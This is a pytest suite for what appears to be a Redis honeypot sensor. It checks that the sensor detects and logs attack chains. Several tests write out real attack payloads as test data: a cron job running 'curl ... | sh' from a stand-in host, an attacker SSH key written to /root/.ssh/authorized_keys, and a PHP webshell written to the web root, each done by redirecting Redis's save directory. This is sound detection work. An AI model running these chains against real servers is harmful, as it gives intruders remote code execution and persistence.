"""What gets recorded: the attack chains bots actually run."""

from __future__ import annotations

import asyncio

import redis.asyncio as aioredis
from conftest import HarnessFactory, cmd, talk


async def test_cron_chain_via_redis_py(make_harness: HarnessFactory) -> None:
    """The classic Redis-to-cron chain, run by a real client."""
    payload = "\n\n*/1 * * * * curl -fsSL http://198.51.100.9/x.sh | sh\n\n"
    async with make_harness() as h:
        r = aioredis.Redis(host="127.0.0.1", port=h.port)
        await r.flushall()
        await r.config_set("dir", "/var/spool/cron/")
        await r.config_set("dbfilename", "root")
        await r.set("x", payload)
        await r.save()
        await r.aclose()
        events = await h.events()
        by_type = {str(t): [e for e in events if e.type == t] for t in {e.type for e in events}}
        sid = {e.session_id for e in events}
        assert len(sid) == 1
        assert next(e.type for e in events) == "connect" and events[-1].type == "disconnect"
        commands = {
            e.data["command"] + ":" + e.data["input"][:40]: e.data for e in by_type["command"]
        }
        flags = [set(e.data["flags"]) for e in by_type["command"]]
        assert any("flushall" in f for f in flags)
        assert any({"config_set_dir", "cron_write"} <= f for f in flags)
        assert any({"config_set_dbfilename", "cron_write"} <= f for f in flags)
        assert any({"cron_payload", "dropper", "download"} <= f for f in flags)
        save = next(d for k, d in commands.items() if k.startswith("SAVE"))
        assert "cron_write" in save["flags"] and save["dir"] == "/var/spool/cron/"
        assert save["dbfilename"] == "root"
        dl = by_type["download_attempt"]
        assert [(e.data["url"], e.data["tool"]) for e in dl] == [
            ("http://198.51.100.9/x.sh", "curl")
        ]
        disc = by_type["disconnect"][0].data
        assert disc["config_changes"] == {"dir": "/var/spool/cron/", "dbfilename": "root"}
        assert {"cron_write", "download"} <= set(disc["flags"])
        assert all(e.dst_port == 6379 and e.sensor == "redis" for e in events)
        assert all(str(e.src_ip) == "127.0.0.1" for e in events)


async def test_ssh_key_chain(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 attacker@example\n\n"
        await talk(
            h.port,
            cmd("CONFIG", "SET", "dir", "/root/.ssh/")
            + cmd("CONFIG", "SET", "dbfilename", "authorized_keys")
            + cmd("SET", "k", key)
            + cmd("SAVE"),
        )
        flags = [set(e.data["flags"]) for e in await h.events("command")]
        assert any("ssh_key_write" in f for f in flags[:2])
        assert any("ssh_key_payload" in f for f in flags)
        assert "ssh_key_write" in flags[-1]


async def test_webshell_and_noisy_flags(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        await talk(
            h.port,
            cmd("CONFIG", "SET", "dir", "/var/www/html")
            + cmd("CONFIG", "SET", "dbfilename", "s.php")
            + cmd("SAVE"),
        )
        assert "webshell_write" in {f for e in await h.events("command") for f in e.data["flags"]}


async def test_command_event_shape(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        await talk(h.port, cmd("SET", "my key", 'va\nl"ue') + cmd("PING"))
        cmds = await h.events("command")
        assert cmds[0].data["input"] == 'SET "my key" "va\\nl\\"ue"'
        assert cmds[0].data["output_preview"] == "+OK\r\n"
        assert cmds[0].data["argc"] == 3 and cmds[1].data["command"] == "PING"


async def test_oversized_fields_are_truncated(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        await talk(h.port, cmd("SET", "k" * 5000, "v" * 400_000), wait=1.0)
        e = (await h.events("command"))[0]
        assert len(e.data["input"]) < 2300
        assert len(e.model_dump_json()) < 16 * 1024


async def test_flood_of_noise_is_capped_but_important_events_survive(
    make_harness: HarnessFactory,
) -> None:
    async with make_harness(max_commands=100_000) as h:
        r, w = await asyncio.open_connection("127.0.0.1", h.port)
        w.write(b"".join(cmd("ECHO", f"n{i}") for i in range(2000)))
        w.write(b"".join(cmd("AUTH", f"pw{i}") for i in range(120)))
        w.write(cmd("CONFIG", "SET", "dir", "/var/spool/cron/"))
        w.write(cmd("SET", "x", "curl http://198.51.100.1/a | sh"))
        await w.drain()
        await asyncio.sleep(1.0)
        w.close()
        disc = (await h.wait_disconnects(1))[0].data
        cmds = await h.events("command")
        assert len([e for e in cmds if e.data["command"] == "ECHO"]) == h.cfg.quota_noisy
        assert disc["suppressed_events"]["noisy"] == 2000 - h.cfg.quota_noisy
        assert len(await h.events("login_attempt")) == h.cfg.quota_logins
        assert disc["suppressed_events"]["login"] == 120 - h.cfg.quota_logins
        assert any("config_set_dir" in e.data["flags"] for e in cmds)
        assert len(await h.events("download_attempt")) == 1


async def test_identical_repeats_are_aggregated(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = cmd("CONFIG", "SET", "dir", "/tmp/") * 300 + cmd("PING") * 50 + cmd("GET", "a")
        await talk(h.port, out, wait=1.0)
        cmds = await h.events("command")
        assert [e.data["command"] for e in cmds] == ["CONFIG", "PING", "GET"]
        assert cmds[0].data["input"] == "CONFIG SET dir /tmp/"
        assert cmds[1].data["repeated_before"] == 299
        assert cmds[2].data["repeated_before"] == 49
        disc = (await h.wait_disconnects(1))[0].data
        assert disc["commands"] == 351 and disc["suppressed_events"]["repeat"] == 348


async def test_loopback_is_quiet_by_default(make_harness: HarnessFactory) -> None:
    async with make_harness(quiet_loopback=True) as h:
        assert await talk(h.port, b"PING\r\n") == b"+PONG\r\n"
        assert await h.events() == []
